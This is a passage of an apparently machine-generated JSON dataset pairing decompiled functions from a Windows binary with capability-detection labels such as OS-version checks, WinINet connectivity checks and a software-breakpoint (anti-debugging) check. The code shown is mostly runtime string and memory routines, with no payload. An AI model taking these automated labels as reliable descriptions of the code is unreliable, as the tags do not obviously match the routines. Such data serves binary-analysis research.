        "decompiled_code": "\nuint __cdecl fcn.00445c90(uint arg_8h)\n\n{\n    char *pcVar1;\n    char cVar2;\n    char *in_EAX;\n    uint in_ECX;\n    int32_t unaff_ESI;\n    \n    if ((in_EAX == NULL) || (*in_EAX == '\\0')) {\n        return 6;\n    }\n    cVar2 = fcn.00445b50(unaff_ESI, in_EAX, in_ECX);\n    if (cVar2 == '\\0') {\n        return 10;\n    }\n    if (in_ECX != '\\0') {\n        return 0;\n    }\n    cVar2 = fcn.00445110(unaff_ESI);\n    if (cVar2 == '\\0') {\n        return 2;\n    }\n    pcVar1 = *(unaff_ESI + 0x804);\n    if ((pcVar1 != NULL) && (cVar2 = *pcVar1,  cVar2 != '\\0')) {\n        if ((cVar2 == 'O') && ((pcVar1[1] == 'K' && (pcVar1[2] == '\\0')))) {\n            return 0;\n        }\n        if ((((cVar2 == 'E') && (pcVar1[1] == 'R')) && (pcVar1[2] == 'R')) &&\n           (((pcVar1[3] == 'O' && (pcVar1[4] == 'R')) && (pcVar1[5] == '\\0')))) {\n            return 5;\n        }\n        if (((cVar2 == 'U') && (pcVar1[1] == 'N')) &&\n           ((pcVar1[2] == 'K' &&\n            ((((pcVar1[3] == 'N' && (pcVar1[4] == 'O')) && (pcVar1[5] == 'W')) &&\n             ((pcVar1[6] == 'N' && (pcVar1[7] == '\\0')))))))) {\n            return 8;\n        }\n    }\n    return 3;\n}\n",
        "token_count": 458
    },
    "00445e60": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00445e60(uint param_1, uint param_2, uint param_3, uint param_4, uint param_5, uint param_6, uint param_7, \n                 uint param_8, uint param_9, uint param_10, uint param_11, uint param_12)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    ushort unaff_BX;\n    int32_t unaff_ESI;\n    uint unaff_EDI;\n    uint32_t noname_1;\n    uint unaff_retaddr;\n    \n    if (-*(unaff_ESI + 0x14) - 1U < 2) {\n        fcn.0044d5f9();\n    }\n    noname_1 = *(unaff_ESI + 0x14) + 1;\n    if (0x7ffffffe < noname_1) {\n        fcn.0044d5f9();\n    }\n    if (*(unaff_ESI + 0x18) < noname_1) {\n        fcn.00445fc0(unaff_ESI, noname_1, *(unaff_ESI + 0x14), unaff_EDI, unaff_retaddr, param_1, param_2, param_3, \n                     param_4, param_5, param_6, param_7, param_8, param_9, param_10, param_11, param_12);\n    }\n    else if (noname_1 == 0) {\n        *(unaff_ESI + 0x14) = 0;\n        if (*(unaff_ESI + 0x18) < 8) {\n            *(unaff_ESI + 4) = 0;\n            return;\n        }\n        **(unaff_ESI + 4) = 0;\n        return;\n    }\n    if (noname_1 != 0) {\n        puVar1 = unaff_ESI + 4;\n        puVar2 = puVar1;\n        if (7 < *(unaff_ESI + 0x18)) {\n            puVar2 = *puVar1;\n        }\n        *(puVar2 + *(unaff_ESI + 0x14) * 2) = unaff_BX;\n        *(unaff_ESI + 0x14) = noname_1;\n        if (7 < *(unaff_ESI + 0x18)) {\n            puVar1 = *puVar1;\n        }\n        *(puVar1 + noname_1 * 2) = 0;\n    }\n    return;\n}\n",
        "token_count": 569
    },
    "00445ef0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00445ef0(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    uint arg_10h;\n    int32_t in_EAX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint32_t uVar2;\n    uint unaff_retaddr;\n    uint in_stack_0000000c;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    \n    if (0x7ffffffe < arg_8h) {\n        fcn.0044d5f9();\n    }\n    uVar1 = *(in_EAX + 0x18);\n    if (uVar1 < arg_8h) {\n        fcn.00445fc0(in_EAX, arg_8h, *(in_EAX + 0x14), unaff_ESI, unaff_EBX, unaff_EBP, unaff_retaddr, arg_8h, arg_ch, \n                     in_stack_0000000c, in_stack_00000010, in_stack_00000014, in_stack_00000018, in_stack_0000001c, \n                     in_stack_00000020, in_stack_00000024, in_stack_00000028);\n        return arg_8h != 0;\n    }\n    if ((arg_ch != '\\0') && (arg_8h < 8)) {\n        uVar2 = *(in_EAX + 0x14);\n        if (arg_8h < *(in_EAX + 0x14)) {\n            uVar2 = arg_8h;\n        }\n        if (7 < uVar1) {\n            arg_10h = *(in_EAX + 4);\n            if (uVar2 != 0) {\n                fcn.0044e57f(in_EAX + 4, 0x10, arg_10h, uVar2 * 2);\n            }\n            fcn.0044d92f(arg_10h);\n        }\n        *(in_EAX + 0x14) = uVar2;\n        *(in_EAX + 0x18) = 7;\n        *(in_EAX + 4 + uVar2 * 2) = 0;\n        return arg_8h != 0;\n    }\n    if (arg_8h == 0) {\n        *(in_EAX + 0x14) = 0;\n        if (7 < uVar1) {\n            **(in_EAX + 4) = 0;\n            return false;\n        }\n        *(in_EAX + 4) = 0;\n    }\n    return arg_8h != 0;\n}\n",
        "token_count": 641
    },
    "00445fc0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint * __cdecl\nfcn.00445fc0(uint noname_0, uint noname_1, int32_t noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6\n            , uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, \n            uint noname_13, uint noname_14, uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    uint *arg_8h_00;\n    int32_t arg_10h;\n    uint *puVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *in_FS_OFFSET;\n    int32_t var_4h;\n    uint32_t var_ch_3;\n    uint var_ch_2;\n    uint var_10h_2;\n    uint var_10h;\n    uint auStack40 [3];\n    uint var_24h;\n    uint uStack24;\n    uchar *puStack20;\n    uint uStack16;\n    uint var_14h;\n    uint var_10h_3;\n    uint var_ch;\n    \n    var_14h = 0x459520;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    puStack20 = &stack0xffffffcc;\n    uVar4 = var_ch_3 | 7;\n    if (uVar4 < 0x7fffffff) {\n        uVar1 = *(var_4h + 0x18);\n        uVar3 = uVar1 >> 1;\n        var_ch_3 = uVar4;\n        if ((uVar4 / 3 < uVar3) && (uVar1 <= 0x7ffffffe - uVar3)) {\n            var_ch_3 = uVar3 + uVar1;\n        }\n    }\n    uVar4 = var_ch_3 + 1;\n    var_10h_3 = 0;\n    if (uVar4 == 0) {\n        uVar4 = 0;\n    }\n    else if (0xffffffff / uVar4 < 2) {\n        uStack24 = 0;\n        fcn.0044e675(&uStack24);\n        auStack40[0] = 0x45a20c;\n        fcn.0044f098(auStack40, 0x45d208);\n        var_10h_3 = CONCAT31(var_10h_3._1_3_, 2);\n        puStack20 = &stack0xffffffc0;\n        fcn.00446130();\n        return 0x446086;\n    }\n    puStack20 = &stack0xffffffcc;\n    arg_8h_00 = fcn.0044db80(uVar4 * 2);\n    if (noname_2 != 0) {\n        if (*(var_4h + 0x18) < 8) {\n            arg_10h = var_4h + 4;\n        }\n        else {\n            arg_10h = *(var_4h + 4);\n        }\n        fcn.0044e57f(arg_8h_00, var_ch_3 * 2 + 2, arg_10h, noname_2 * 2);\n    }\n    if (7 < *(var_4h + 0x18)) {\n        fcn.0044d92f();\n    }\n    *(var_4h + 4) = arg_8h_00;\n    *(var_4h + 0x18) = var_ch_3;\n    *(var_4h + 0x14) = noname_2;\n    puVar2 = var_4h + 4;\n    if (7 < var_ch_3) {\n        puVar2 = arg_8h_00;\n    }\n    *(puVar2 + noname_2 * 2) = 0;\n    *in_FS_OFFSET = uStack16;\n    return puVar2;\n}\n",
        "token_count": 924
    },
    "00446130": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00446130(uint32_t param_1)\n\n{\n    code *pcVar1;\n    uint var_10h;\n    uint var_4h;\n    \n    if (param_1 == 0) {\n        param_1 = 0;\n    }\n    else if (0xffffffff / param_1 < 2) {\n        var_4h = 0;\n        fcn.0044e675(&var_4h);\n        var_10h = 0x45a20c;\n        fcn.0044f098(&var_10h, 0x45d208);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    fcn.0044db80(param_1 * 2);\n    return;\n}\n",
        "token_count": 174
    },
    "0044ad10": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * __cdecl fcn.0044ad10(uint *arg_8h)\n\n{\n    int64_t iVar1;\n    int16_t *in_ECX;\n    int32_t iVar2;\n    int16_t *piVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    uStack12 = 0x459428;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    arg_8h[2] = 0;\n    var_4h = 0;\n    piVar3 = in_ECX;\n    if (*in_ECX != 0) {\n        do {\n            if (*piVar3 == 0x5c) {\n                if (in_ECX < piVar3) {\n                    iVar2 = piVar3 - in_ECX >> 1;\n                    iVar1 = (iVar2 + 1) * 2;\n                    var_14h = iVar2;\n                    var_18h = fcn.0044d234(-(iVar1 >> 0x20 != 0) | iVar1);\n                    fcn.00452100(var_18h, in_ECX, iVar2 * 2);\n                    *(iVar2 * 2 + var_18h) = 0;\n                    var_4h._0_1_ = 1;\n                    fcn.0044cfd0(&var_18h);\n                    var_4h = var_4h._1_3_ << 8;\n                    fcn.0044d924(var_18h);\n                }\n                in_ECX = piVar3 + 1;\n            }\n            piVar3 = piVar3 + 1;\n        } while (*piVar3 != 0);\n        if (in_ECX < piVar3) {\n            iVar4 = piVar3 - in_ECX >> 1;\n            iVar1 = (iVar4 + 1) * 2;\n            var_14h = iVar4;\n            iVar2 = fcn.0044d234(-(iVar1 >> 0x20 != 0) | iVar1);\n            var_18h = iVar2;\n            fcn.00452100(iVar2, in_ECX, iVar4 * 2);\n            *(iVar4 * 2 + iVar2) = 0;\n            var_4h = CONCAT31(var_4h._1_3_, 2);\n            fcn.0044cfd0(&var_18h);\n            fcn.0044d924(iVar2);\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 635
    },
    "0044ae30": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.0044ae30(int32_t *arg_8h, int32_t *arg_ch, int32_t arg_10h)\n\n{\n    uint16_t uVar1;\n    int16_t iVar2;\n    int64_t iVar3;\n    int32_t iVar4;\n    uint16_t *puVar5;\n    int16_t *piVar6;\n    uint16_t *puVar7;\n    uint16_t *puVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    uint *in_FS_OFFSET;\n    bool bVar11;\n    int32_t var_2ch;\n    uint32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    int16_t *var_10h;\n    uint var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x459509;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    uVar9 = 0;\n    var_14h = 0;\n    var_20h = 0;\n    var_1ch = 0;\n    var_18h = 0;\n    var_4h = 1;\n    if (arg_8h[2] != 0) {\n        do {\n            var_10h = *arg_8h + uVar9 * 8;\n            fcn.0044d180(&var_10h);\n            uVar9 = uVar9 + 1;\n        } while (uVar9 < arg_8h[2]);\n    }\n    fcn.0044ad10(&var_2ch);\n    var_4h = CONCAT31(var_4h._1_3_, 2);\n    arg_8h = NULL;\n    if (var_24h != 0) {\n        do {\n            puVar5 = *(var_2ch + arg_8h * 8);\n            puVar7 = 0x45c400;\n            puVar8 = puVar5;\n            do {\n                uVar1 = *puVar8;\n                bVar11 = uVar1 < *puVar7;\n                if (uVar1 != *puVar7) {\ncode_r0x0044aee8:\n                    iVar4 = (1 - bVar11) - (bVar11 != 0);\n                    goto code_r0x0044aeed;\n                }\n                if (uVar1 == 0) break;\n                uVar1 = puVar8[1];\n                bVar11 = uVar1 < puVar7[1];\n                if (uVar1 != puVar7[1]) goto code_r0x0044aee8;\n                puVar8 = puVar8 + 2;\n                puVar7 = puVar7 + 2;\n            } while (uVar1 != 0);\n            iVar4 = 0;\ncode_r0x0044aeed:\n            if (iVar4 != 0) {\n                puVar8 = 0x45c404;\n                do {\n                    uVar1 = *puVar5;\n                    bVar11 = uVar1 < *puVar8;\n                    if (uVar1 != *puVar8) {\ncode_r0x0044af1e:\n                        iVar4 = (1 - bVar11) - (bVar11 != 0);\n                        goto code_r0x0044af23;\n                    }\n                    if (uVar1 == 0) break;\n                    uVar1 = puVar5[1];\n                    bVar11 = uVar1 < puVar8[1];\n                    if (uVar1 != puVar8[1]) goto code_r0x0044af1e;\n                    puVar5 = puVar5 + 2;\n                    puVar8 = puVar8 + 2;\n                } while (uVar1 != 0);\n                iVar4 = 0;\ncode_r0x0044af23:\n                if (iVar4 == 0) {\n                    if (var_18h != 0) {\n                        var_18h = var_18h - 1;\n                    }\n                }\n                else {\n                    arg_10h = var_2ch + arg_8h * 8;\n                    fcn.0044d180(&arg_10h);\n                }\n            }\n            arg_8h = arg_8h + 1;\n        } while (arg_8h < var_24h);\n    }\n    *arg_ch = 0;\n    arg_ch[1] = 0;\n    iVar4 = fcn.0044d234(2);\n    *arg_ch = iVar4;\n    *(iVar4 + arg_ch[1] * 2) = 0;\n    var_14h = 1;\n    arg_8h = NULL;\n    if (var_18h != 0) {\n        do {\n            if (arg_8h != NULL) {\n                iVar10 = arg_ch[1] + 1;\n                iVar3 = (arg_ch[1] + 2) * 2;\n                iVar4 = fcn.0044d234(-(iVar3 >> 0x20 != 0) | iVar3);\n                fcn.00452100(iVar4, *arg_ch, arg_ch[1] * 2);\n                *(iVar4 + arg_ch[1] * 2) = *0x45c40c;\n                *(iVar4 + iVar10 * 2) = 0;\n                fcn.0044d924(*arg_ch);\n                *arg_ch = iVar4;\n                arg_ch[1] = iVar10;\n            }\n            var_10h = **(var_20h + arg_8h * 4);\n            piVar6 = var_10h;\n            do {\n                iVar2 = *piVar6;\n                piVar6 = piVar6 + 1;\n            } while (iVar2 != 0);\n            arg_10h = piVar6 - (var_10h + 1) >> 1;\n            iVar10 = arg_ch[1] + arg_10h;\n            iVar3 = (iVar10 + 1) * 2;\n            iVar4 = fcn.0044d234(-(iVar3 >> 0x20 != 0) | iVar3);\n            fcn.00452100(iVar4, *arg_ch, arg_ch[1] * 2);\n            fcn.00452100(iVar4 + arg_ch[1] * 2, var_10h, arg_10h * 2);\n            *(iVar4 + iVar10 * 2) = 0;\n            fcn.0044d924(*arg_ch);\n            arg_8h = arg_8h + 1;\n            *arg_ch = iVar4;\n            arg_ch[1] = iVar10;\n        } while (arg_8h < var_18h);\n    }\n    var_4h = CONCAT31(var_4h._1_3_, 1);\n    if (var_2ch != 0) {\n        fcn.0044ddf9(var_2ch, 8, *(var_2ch + -4), 0x43b090);\n        fcn.0044d924(var_2ch + -4);\n    }\n    fcn.0044d924(var_20h);\n    *in_FS_OFFSET = var_ch;\n    return arg_ch;\n}\n",
        "token_count": 1645
    },
    "0044d3ef": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl fcn.0044d3ef(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint arg_8h_00;\n    uint arg_8h_01;\n    int32_t arg_10h;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint32_t uVar3;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.0044f51a(0xc);\n    *(unaff_EBP + -0x18) = extraout_ECX;\n    uVar3 = *(unaff_EBP + 8) | 0xf;\n    if (uVar3 == 0xffffffff) {\n        uVar3 = *(unaff_EBP + 8);\n    }\n    else {\n        uVar1 = *(extraout_ECX + 0x18);\n        *(unaff_EBP + -0x14) = uVar1;\n        *(unaff_EBP + -0x14) = *(unaff_EBP + -0x14) >> 1;\n        uVar2 = *(unaff_EBP + -0x14);\n        if ((uVar3 / 3 < uVar2) && (uVar1 <= -uVar2 - 2)) {\n            uVar3 = uVar2 + uVar1;\n        }\n    }\n    *(unaff_EBP + -4) = 0;\n    arg_8h_01 = fcn.0044d34f(uVar3 + 1);\n    if (*(unaff_EBP + 0xc) != 0) {\n        if (*(extraout_ECX + 0x18) < 0x10) {\n            arg_10h = extraout_ECX + 4;\n        }\n        else {\n            arg_10h = *(extraout_ECX + 4);\n        }\n        fcn.0044d364(arg_8h_01, uVar3 + 1, arg_10h, *(unaff_EBP + 0xc));\n    }\n    fcn.0044d3a2(1, 0);\n    arg_8h_00 = *(unaff_EBP + 0xc);\n    *(extraout_ECX + 4) = arg_8h_01;\n    *(extraout_ECX + 0x18) = uVar3;\n    fcn.0044d32e(arg_8h_00);\n    fcn.0044f550();\n    return;\n}\n",
        "token_count": 597
    },
    "0044e742": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044e742(uint *param_1)\n\n{\n    *param_1 = 0x45a264;\n    if (param_1[2] != 0) {\n        fcn.0044f564(param_1[1]);\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "0044f564": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0044f564(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00450bc8(0x45ccd0, 0xc);\n    iVar1 = *(unaff_EBP + 8);\n    if (iVar1 != 0) {\n        if (*0x463fe0 == 3) {\n            fcn.004548ce(4);\n            *(unaff_EBP + -4) = 0;\n            arg_8h_00 = fcn.00454901(iVar1);\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 != 0) {\n                fcn.00454931(arg_8h_00, iVar1);\n            }\n            *(unaff_EBP + -4) = 0xfffffffe;\n            fcn.0044f5ba();\n            if (*(unaff_EBP + -0x1c) != 0) goto code_r0x0044f5ec;\n            iVar1 = *(unaff_EBP + 8);\n        }\n        iVar1 = (*_fcn.0045a100)(*0x462634, 0, iVar1);\n        if (iVar1 == 0) {\n            fcn.00450859();\n            fcn.00624a92();\n            return;\n        }\n    }\ncode_r0x0044f5ec:\n    fcn.00450c0d();\n    return;\n}\n",
        "token_count": 379
    },
    "0044de44": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044de44(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) == 0) {\n        fcn.0044dd9b(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14));\n    }\n    return;\n}\n",
        "token_count": 126
    },
    "0044ed3f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044ed3f(uint arg_8h, uint arg_ch, uint noname_2, uint noname_3, uint arg_18h)\n\n{\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x20) == 0) {\n        fcn.0044dd9b(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + -0x1c), *(unaff_EBP + 0x18));\n    }\n    return;\n}\n",
        "token_count": 140
    },
    "0044f1e8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0044f1e8(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint arg_8h, uint arg_ch, uint noname_17, uint noname_18, uint arg_18h, uint arg_1ch, \n            uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *var_8h_3;\n    uint *var_ch_2;\n    uint var_10h_2;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    code *var_2ch;\n    uint *var_28h_2;\n    code *pcStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    uint *puStack28;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar *var_8h_2;\n    int32_t var_4h_2;\n    \n    var_8h_2 = &stack0xfffffffc;\n    puStack16 = &stack0xffffffc0;\n    if (var_8h_3 == 0x123) {\n        *var_ch_2 = 0x44f293;\n        var_38h = 1;\n    }\n    else {\n        pcStack40 = fcn.0044f2bf;\n        uStack36 = *0x45f8b4 ^ &fcn.0044f1e8::var_28h_2;\n        uStack32 = var_24h;\n        puStack28 = var_ch_2;\n        uStack24 = var_20h;\n        uStack20 = var_1ch;\n        var_4h_2 = 0;\n        var_28h_2 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.0044f1e8::var_28h_2;\n        var_34h = var_8h_3;\n        var_30h = var_10h_2;\n        iVar1 = fcn.004502c1();\n        var_2ch = *(iVar1 + 0x80);\n        (*var_2ch)(*var_8h_3, &fcn.0044f1e8::var_34h);\n        var_38h = 0;\n        if (var_4h_2 == 0) {\n            *in_FS_OFFSET = var_28h_2;\n        }\n        else {\n            *var_28h_2 = **in_FS_OFFSET;\n            *in_FS_OFFSET = var_28h_2;\n        }\n    }\n    return var_38h;\n}\n",
        "token_count": 734
    },
    "0044fe1e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044fe1e(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    code *unaff_ESI;\n    \n    iVar1 = arg_8h;\n    func_0x0044b878();\n    (*unaff_ESI)(arg_8h);\n    if (*(arg_8h + 0xb0) != 0) {\n        (*unaff_ESI)(*(arg_8h + 0xb0));\n    }\n    if (*(arg_8h + 0xb8) != 0) {\n        (*unaff_ESI)(*(arg_8h + 0xb8));\n    }\n    if (*(arg_8h + 0xb4) != 0) {\n        (*unaff_ESI)(*(arg_8h + 0xb4));\n    }\n    if (*(arg_8h + 0xc0) != 0) {\n        (*unaff_ESI)(*(arg_8h + 0xc0));\n    }\n    piVar2 = arg_8h + 0x50;\n    arg_8h = 6;\n    do {\n        if ((piVar2[-2] != 0x45f5b8) && (*piVar2 != 0)) {\n            (*unaff_ESI)(*piVar2);\n        }\n        if ((piVar2[-1] != 0) && (piVar2[1] != 0)) {\n            (*unaff_ESI)(piVar2[1]);\n        }\n        piVar2 = piVar2 + 4;\n        arg_8h = arg_8h + -1;\n    } while (arg_8h != 0);\n    (*unaff_ESI)(*(iVar1 + 0xd4) + 0xb4);\n    return;\n}\n",
        "token_count": 403
    },
    "00452a20": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x00452b13: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00452b18)\n// WARNING: Removing unreachable block (ram,0x00452b46)\n// WARNING: Removing unreachable block (ram,0x00452b1e)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00452a20(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t unaff_EBP;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00450bc8(0x45ce40, 0x18);\n    fcn.004548ce(8);\n    *(unaff_EBP + -4) = 0;\n    if (*0x462520 != 1) {\n        *0x46251c = 1;\n        *0x462518 = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar1 = fcn.00450075(*0x464108);\n            *(unaff_EBP + -0x28) = piVar1;\n            if (piVar1 != NULL) {\n                piVar2 = fcn.00450075(*0x464104);\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x1c) = piVar1;\n                *(unaff_EBP + -0x20) = piVar2;\n                while( true ) {\n                    piVar2 = piVar2 + -1;\n                    *(unaff_EBP + -0x24) = piVar2;\n                    if (piVar2 < piVar1) break;\n                    iVar3 = fcn.0045006c();\n                    if (*piVar2 != iVar3) {\n                        if (piVar2 < piVar1) break;\n                        pcVar4 = fcn.00450075(*piVar2);\n                        iVar3 = fcn.0045006c();\n                        *piVar2 = iVar3;\n                        (*pcVar4)();\n                        iVar3 = fcn.00450075(*0x464108);\n                        piVar1 = fcn.00450075(*0x464104);\n                        if ((*(unaff_EBP + -0x1c) != iVar3) || (*(unaff_EBP + -0x20) != piVar1)) {\n                            *(unaff_EBP + -0x1c) = iVar3;\n                            *(unaff_EBP + -0x28) = iVar3;\n                            *(unaff_EBP + -0x20) = piVar1;\n                            *(unaff_EBP + -0x24) = piVar1;\n                            piVar2 = piVar1;\n                        }\n                        piVar1 = *(unaff_EBP + -0x28);\n                    }\n                }\n            }\n            fcn.0045295a(0x45a1fc);\n        }\n        fcn.0045295a(0x45a204);\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.004547f4(8);\n    }\n    return;\n}\n",
        "token_count": 788
    },
    "00452e13": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
